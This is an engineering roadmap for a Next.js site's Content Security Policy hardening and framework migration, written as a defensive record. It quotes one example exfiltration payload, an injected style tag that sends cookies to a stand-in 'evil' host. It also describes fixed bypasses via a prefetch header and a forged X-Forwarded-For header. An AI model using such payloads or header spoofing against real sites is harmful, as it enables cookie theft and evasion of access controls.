# CSP and Next.js Roadmap

> Historical record of the CSP hardening + Next.js modernization project. All originally deferred items have shipped. Lessons learned during implementation are captured at the bottom so future agents don't re-discover them. The "Current state" section is kept accurate; the sections after it describe what shipped at the time and are annotated where the code has since moved on.

---

## Update 2026-10-20 (the `tune-up` branch)

What changed around the CSP and the proxy since the September state below:

- **`proxy.ts` is now thin and tested.** Every pure piece (user-agent classification, blocked paths, IP checks, `buildCspHeader`, `buildReportingEndpointsHeader`) moved to `lib/proxy-security.ts`, which imports nothing from Next and takes every input as a parameter. `tests/unit/proxy-security.test.ts` covers the helpers; `tests/integration/proxy.test.ts` imports `proxy.ts` itself under each environment variant.
- **The CSP is on every response**, built before any check runs: 403s (blocked IP, scanner path, blocked user agent, fake-mobile) and allowlisted crawlers all leave with the policy and the nonce. Previously the deny paths returned bare JSON.
- **The matcher excludes only Next's build assets**: `/_next/static/…` (with the slash) and exactly `/_next/image`. A short-lived exemption for requests carrying the client router's `next-router-prefetch` header was removed the same week: any client can send that header, so it let a blocked IP skip the blocklist, and `/_next/static-x` style paths skipped the proxy too. `robots.txt`, `sitemap.xml`, `site.webmanifest`, `sw.js`, `favicon.ico`, `static` and `monitoring` came off the exclusion list because matcher exclusions are prefixes: `/robots.txt-x` or `/monitoring-x` would have rendered the HTML 404 without a CSP. Browser `Purpose: prefetch` requests are no longer skipped either, since they fetch real documents. `tests/integration/proxy.test.ts` checks the matcher with Next's `unstable_doesMiddlewareMatch`.
- **`report-to` was added** next to `report-uri`, with a `Reporting-Endpoints: csp-endpoint="…"` response header (Reporting API v1). Both point at the same Sentry security endpoint.
- **IP blocklists moved out of the source** into `BLOCKED_IPS` and `BLOCKED_IP_PREFIXES` (see `.env.example`). Absent or empty means no IP-based blocking. The plain-HTTP-client user agents (curl, python-requests, …) were dropped from `BLOCKED_USER_AGENTS` on purpose: they blocked uptime monitors and header audits while stopping nobody.
- **`public/sw.js` is now a self-unregistering stub.** The site registers no service worker any more; the file stays served so returning browsers pick it up, wipe the old caches and unregister. Delete it after about 2027-03. Everything below about caching strategies is history.
- **Fonts are self-hosted** by `next/font`, so the `fonts.googleapis.com` / `fonts.gstatic.com` entries are gone; `font-src` is `'self'`. Plausible was added to `script-src` and `connect-src`; its inline bootstrap in `app/layout.tsx` carries the nonce.
- **The e2e suite enforces the policy**: every sitemap route is loaded in Chromium under the real production CSP and any `securitypolicyviolation` event or CSP console error fails the run.
- Counts that drifted: motion is 13.x (not 12), and there are 22 `style={{}}` props across 9 files (not ~149).

---

## Current state (as of 2026-10-20)

**Framework**: Next.js 16 (App Router), React 19, Tailwind 4 (CSS-first `@theme` in `styles/global.css`), motion 14, vanilla-cookieconsent 3, TypeScript 7. Bun 1.4 pinned via `.bun-version` (CI + Render). No AI SDK — EVE calls DeepSeek's Chat Completions API via `fetch`. Sentry (`@sentry/nextjs` 11) for error monitoring and CSP reports.

**Rendering**: every route renders dynamically per request via `export const dynamic = 'force-dynamic'` in `app/layout.tsx`. This is the cost of nonce-based CSP — there is no static prerendering on this site except `/sitemap.xml`. TTFB is +20–100ms vs the prior fully-static build; Render's instance billing model means cost impact is negligible at our traffic.

**CSP** (built by `buildCspHeader` in `lib/proxy-security.ts`, set by `proxy.ts` on every response except Next's build assets, per-request nonce via `btoa(crypto.randomUUID())`):
- `script-src 'self' 'nonce-<…>' 'strict-dynamic' https://www.googletagmanager.com https://www.google-analytics.com https://plausible.io` — the host list is only a fallback for browsers without `'strict-dynamic'`; `'unsafe-eval'` is in dev only (React Refresh needs it)
- `style-src 'self' 'unsafe-inline'` (fallback for browsers that don't understand the granular directives)
- `style-src-elem 'self'` — modern browsers: strict, no `<style>` tag injection (dev adds `'unsafe-inline'` for Turbopack HMR styles)
- `style-src-attr 'unsafe-inline'` — modern browsers: allow React `style={{}}` props (22 in the codebase, mostly motion start values)
- `img-src 'self' data:` + GA hosts; `connect-src 'self'` + GA and Plausible hosts; `font-src 'self'`; `media-src 'self'`
- `upgrade-insecure-requests` only when the request itself was HTTPS (Render terminates TLS upstream and sets `x-forwarded-proto: https`); skipped locally so dev over HTTP doesn't break
- Strict non-script directives: `object-src 'none'`, `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'`
- `report-uri` → Sentry security endpoint (`clb-website` project) and `report-to csp-endpoint`, resolved by the `Reporting-Endpoints` header to the same endpoint; violations show up as Sentry issues
- Set `CSP_REPORT_ONLY=true` in env to ship the policy under the `Content-Security-Policy-Report-Only` header name (safety-net for first deploys of CSP changes)

**Auto-noncing**: Next 16 auto-attaches the request's nonce to every framework script tag in the served HTML (including inline RSC payload scripts). Our own `<script>` tags — JSON-LD in `app/<route>/page.tsx` and the Plausible loader + bootstrap in `app/layout.tsx` — explicitly thread the nonce via `headers()` from `next/headers`.

**Inline scripts/styles of our authorship**: zero `<style>` tags. JSON-LD blocks and the Plausible bootstrap are inline `<script>` tags with nonce. Cookie consent runs from `components/CookieConsentLoader.tsx` via dynamic `import('vanilla-cookieconsent')` from a `'use client'` component — bundled into Next's nonced client chunks, no inline anything. The GA loader creates its `<script>` element at runtime, which `'strict-dynamic'` allows.

**Service worker** (`public/sw.js`): a self-unregistering stub. Per-request nonces make HTML caching impossible — cached HTML would ship a stale nonce that wouldn't match the current response's CSP, blocking every framework script — so the worker was removed altogether rather than kept as a network-only shell.

**Automation**: Dependabot watches `bun` + `github-actions` weekly (Mondays 9am PT), grouping patch and minor updates. Major bumps are ignored for `next`, `react`, `react-dom`, `@types/react`, `@types/react-dom`, `@types/node`, `tailwindcss` and `typescript` — those migrations are done by hand; majors of everything else still get their own PR (`.github/dependabot.yml`).

---

## What shipped on `app-router-next16` branch (2026-05-26)

A single bundled PR that closed all 6 originally-deferred items plus structural framework upgrade:

### 1. Pages Router → App Router (the foundation)

Every page moved from `pages/<route>.tsx` to `app/<route>/page.tsx` + `<Route>Client.tsx` using the **server-wrapper pattern**:
- `page.tsx` is a server component, `async`, reads `nonce` via `await headers()`, exports `metadata` + `viewport`, renders Header + JSON-LD `<script nonce={nonce}>` + `<RouteClient />` + Footer
- `<Route>Client.tsx` has `'use client'` directive and contains the original page's JSX/hooks (Head removed, JSON-LD removed — moved up to the server wrapper)

Why split: Metadata API only exports from server components. Pages with `'use client'` directive can't export `metadata`. Server wrapper handles metadata + nonce reading; client child handles interactive behavior. Clean separation.

*(Since then most routes dropped their `<Route>Client.tsx` entirely: `about`, `projects`, `news`, `privacy` and `sms` render as server components with `<Reveal>` as the only client boundary. `BlogClient.tsx` and `FaqClient.tsx` remain, and the home page's sections are server components that `app/page.tsx` passes to `IndexClient` as children so they stay out of the client bundle.)*

### 2. Next 14 → 16, React 18 → 19

Dep bumps in one shot:
- `middleware.ts` renamed to `proxy.ts` per Next 16 convention (function name `middleware` → `proxy`)
- `headers()`, `cookies()`, `params`, `searchParams` became async — every call site `await`s now
- Turbopack default for both `next dev` and `next build` — no custom webpack config so no impact
- `next lint` removed — we never used it (Biome runs directly)
- `images.minimumCacheTTL` default changed 60s → 14400s; kept our explicit 60 override
- `JSX` namespace removed from React 19 globals — added `import type { JSX } from 'react'` where needed (Footer, Header)
- Node ≥ 20.9 required

### 3. Nonce CSP — `'unsafe-inline'` and `'unsafe-eval'` out of `script-src`

`proxy.ts` generates a per-request nonce, injects it into request headers as `x-nonce`, and sets the CSP response header with `'nonce-<…>' 'strict-dynamic'`. Server components consume the nonce via `await headers()` from `next/headers` and thread it to their `<script>` tags. Framework scripts get auto-nonced by Next 16.

CSP moved from `next.config.js` headers (static) to `proxy.ts` (per-request). Non-CSP security headers (HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy) stayed in `next.config.js` since they're request-independent.

### 4. Osano cookie consent → vanilla-cookieconsent v3.1.0

`components/CookieConsentLoader.tsx` (new) dynamically imports vanilla-cookieconsent and its CSS from a `'use client'` `useEffect`. Theme via CSS variables (`--cc-bg`, `--cc-btn-primary-bg`, etc.) in `styles/global.css`. GA loader gated on `onConsent`/`onChange` callbacks via `acceptedCategory('analytics')`.

Why swap: Osano runtime-injects `<style>` elements via `document.createElement('style')` + `.sheet.insertRule()` — incompatible with strict `style-src-elem` regardless of nonces. vanilla-cookieconsent v3 ships a single bundled CSS file (no runtime injection) so it works under strict CSP. Roll-your-own (~150 lines) was rejected as it would have been a half-finished library.

Deleted: `public/static/cookieconsent.js`, `public/static/cookieconsent.css`, `public/static/cookieconsent-init.js`.

### 5. Style-src split

- `style-src-elem 'self' https://fonts.googleapis.com` — strict; blocks injected `<style>` tags (the real XSS vector — `<style>body{background:url(http://evil/?cookies)}</style>`). *(The Google Fonts host was dropped later, once `next/font` self-hosted the fonts.)*
- `style-src-attr 'unsafe-inline'` — allows React `style={{}}` props (~149 across the codebase at the time, for parallax, animation, dynamic colors; 22 as of 2026-10-20)
- Parent `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com` retained as fallback for browsers that don't honor the granular directives

### 6. Service worker tightening

`public/sw.js`:
- `STATIC_CACHE_URLS` reduced from `['/', '/home', '/about', ..., '/manifest.json']` to just `['/manifest.json']`
- `handlePageRequest` rewritten stale-while-revalidate → network-only
- `CACHE_VERSION` `v2.0.0` → `v3.0.0` to bust any v2 caches in returning visitors' browsers

*(Superseded on 2026-10-20: the registration was removed and `sw.js` became a self-unregistering stub; see the update at the top.)*

### 7. Custom `app/not-found.tsx`

Next's default not-found component ships its React tree (including `body{background:#fff}` styles) serialized in every page's RSC payload. During hydration the subtree briefly mounts before its boundary collapses → white flash on every page. Replacing it with our own dark-themed `app/not-found.tsx` swaps the default tree in the RSC payload.

---

## Gotchas hit during implementation (read before similar projects)

These are the bugs that took multiple debug cycles to find. All documented inline in code where relevant; collected here for visibility.

### 1. Tailwind `content` paths went stale silently
`tailwind.config.js` `content` array pointed at `./pages/**/*` which got deleted. Tailwind generated CSS with only the classes used in `components/**` — pages rendered with structural HTML but missing all colors/sizes/layouts. No error, no warning. CSS bundle dropped from ~49KB (correct) to ~38KB.

**Symptom**: pages render structurally but visually broken. **Fix**: update `content: ['./app/**/*.{js,ts,jsx,tsx}', './components/**/*.{js,ts,jsx,tsx}']`. *(Tailwind 4 has since replaced `tailwind.config.js` with `@theme` in `styles/global.css` and automatic source detection; there is no content array to go stale any more.)*

### 2. Static prerender + per-request nonce = blocked scripts
A statically prerendered page has nonce attributes baked into framework `<script>` tags at build time. When the proxy injects a *per-request* nonce into the CSP header, the build-time nonces don't match → every script blocked. Real-browser-only failure mode (HTTP-only smoke tests pass because they don't execute JS).

**Symptom**: `/privacy` (and any page without `headers()` reads) ships 20 unnonced framework scripts. **Fix**: `export const dynamic = 'force-dynamic'` in `app/layout.tsx` — every route renders dynamically per request. *(The e2e suite now catches this class of bug: it loads every route in Chromium under the enforced CSP and fails on any violation.)*

### 3. `upgrade-insecure-requests` breaks local HTTP dev
Once we set `upgrade-insecure-requests` in CSP, Safari (strictest of the browsers) upgrades every subresource URL from `http://` to `https://`. Production behind Render's TLS terminator: fine. Local `http://localhost:4321`: every asset fails TLS handshake → blank page with TLS errors in console.

**Fix**: in `proxy.ts`, only emit `upgrade-insecure-requests` when `request.headers.get('x-forwarded-proto') === 'https' || request.nextUrl.protocol === 'https:'`.

### 4. Default `not-found` ships white body CSS to every page
See §7 above. Next's default not-found component serializes `body{background:#fff}` into the RSC payload of every route, causing brief white flashes during hydration. **Fix**: `app/not-found.tsx` override.

### 5. Negative z-index + opaque `<body>` background = hidden elements
We added `<body style={{ background: '#000' }}>` to mask transient white flashes. This broke background videos on 5 pages that used `z-[-10]` wrappers — body's solid background paints OVER negative-z-index elements in the same stacking context (positive z-index elements paint AFTER body bg in the CSS stacking algorithm).

**Symptom**: background videos rendered as black on `/projects`, `/blog`, `/news`, `/faq`, `/operations-consulting`, `/about`. **Fix**: `z-[-10]` → `z-0` across all 5 wrappers; their parent `<main>` elements already had `z-10` so layering still works. *(`/operations-consulting` has since been removed; `next.config.js` redirects it to `/`.)*

### 6. Skip-nav `focus:not-sr-only` triggered by Next's WCAG auto-focus
Next 16 App Router auto-focuses content after client-side navigation for screen-reader users. That programmatic `.focus()` triggers the `:focus` pseudo-class on the skip-nav link, popping it visually via `focus:not-sr-only`. Switching to `focus-visible:` helped but Safari's focus-visible heuristic still occasionally treated post-navigation focus as keyboard-derived.

**Fix at the time**: skip-nav was made permanently `sr-only`. **Current fix** (`components/Header.tsx`): the link uses `focus-visible:not-sr-only` again, and a `useEffect` keyed on `pathname` blurs it whenever Next's post-navigation heuristic parks focus on it. Sighted keyboard users get the visible cue back on Tab, and `tests/e2e/navigation.e2e.ts` asserts it is the first tab stop, visible when focused, and moves focus to `main#main-content`.

### 7. Safari caches backdrop-filter compositor across soft navigations
`backdrop-filter: blur(4px)` on `.header` caused a stale-backdrop visual glitch in Safari during App Router soft navigations — until any user click triggered a repaint. Synthetic repaint via `transform: translateZ(0)` made it worse.

**Fix**: removed `backdrop-filter` entirely. Header is now a flat `rgba(0,0,0,0.7)` translucent strip (`0.85` when scrolled). Sacrifices the frosted-glass aesthetic; not worth the visual bug.

### 8. Video element first-frame decode = brief white flash
Video elements rendered nothing until their first frame decoded, and Safari's "empty video" default rendering can be light. Adding `preload="auto"`, explicit `width`/`height`, `poster="data:image/png;base64,..."` (1×1 black), and `background: '#000'` mitigated most cases. The structural fix was rendering BOTH `<Image>` (for /home) and `<video>` (for other pages) permanently and toggling visibility via Tailwind `hidden` class — so nothing re-mounts on client-side navigation.

### 9. Bun's `Buffer` vs Edge `btoa`
`proxy.ts` runs on Node (Next 16 dropped Edge support for `proxy`). Both `Buffer.from(...)` and `btoa(...)` work but `btoa` is shorter and runtime-agnostic. We use `btoa(crypto.randomUUID())` for the nonce.

### 10. Render `x-forwarded-proto` is load-bearing
Render terminates TLS and forwards as `http://` internally, setting `x-forwarded-proto: https`. Our `upgrade-insecure-requests` conditional depends on this header being honored. Confirmed working; if Render's proxy config ever changes, it will need re-validation. `tests/integration/proxy.test.ts` pins the `x-forwarded-proto` behaviour.

### 11. Never trust the first `x-forwarded-for` hop on Render
Render appends to whatever `X-Forwarded-For` the client sent instead of replacing it, so the first entry is client-controlled. Until 2026-10-21 `getClientIp` read it, and a forged header both reset EVE's per-IP limit and dodged `BLOCKED_IPS` (verified against production). `getClientIp` (`lib/proxy-security.ts`) now trusts `CF-Connecting-IP`, which Render's Cloudflare edge sets and overwrites, and falls back to the last forwarded hop only outside Render.

---

## Open opportunistic items (not blockers)

### 1. Inline `style={{}}` props → Tailwind classes
22 `style={{}}` props remain across 9 files (motion start values such as the animated border colour in `ProjectCard`, the canvas-adjacent hero, `global-error.tsx` which has no stylesheet on purpose). Most are necessary. Net security gain of removing the rest: small (`style-src-attr` is a much lower-leverage XSS vector than `script-src`). **Do opportunistically when touching files, not as a dedicated project.**

### 2. `'unsafe-eval'` in dev only — keep verifying motion doesn't trip prod
`'unsafe-eval'` is in `script-src` only when `NODE_ENV === 'development'`. motion 14 doesn't use `eval`/`new Function()` on any route the e2e suite loads (it runs under the enforced production policy in Chromium). Real-traffic reports in Sentry remain the check for other browsers; if violations appear, add `'unsafe-eval'` to the prod CSP and re-evaluate.

### 3. `backdrop-filter` blur restoration
Removed in §7 above. Restoring requires either a WebKit fix for the stale-compositor bug or a different visual approach (e.g., always-solid header background with no blur claim). Low priority — current solid translucent header looks fine.

### 4. Bundle reduction via partial-prerendering or static islands
Every route is `ƒ Dynamic` now. Some routes have stable content that could benefit from PPR or static islands once Next stabilizes those features for App Router with nonce CSP. Investigate post-Next-17.

*(The former item about the service worker's offline page is gone with the service worker.)*

---

## Files changed by the migration

| Type | Files |
|---|---|
| New | `app/layout.tsx`, `app/not-found.tsx`, `app/sitemap.ts`, `app/*/page.tsx` (×9), `app/*/<Route>Client.tsx` (×9), `app/api/chat/route.ts`, `app/api/substack/route.ts`, `proxy.ts`, `components/AnalyticsTracker.tsx`, `components/CookieConsentLoader.tsx` |
| Deleted | `pages/` (all 13 files), `middleware.ts`, `public/static/cookieconsent.{js,css,-init.js}`, the previous `docs/CSP-AND-NEXTJS-ROADMAP.md` (replaced by this doc) |
| Modified | `package.json`, `bun.lock`, `tsconfig.json`, `biome.json`, `tailwind.config.js`, `next.config.js`, `styles/global.css`, `public/sw.js`, all 6 client-using components in `components/` (added `'use client'` + JSX import), `context/ChatContext.tsx` (`'use client'`) |

Total: ~35 files, +192/-5994 lines (the big deletion is the bundled Osano library + Pages Router page files).
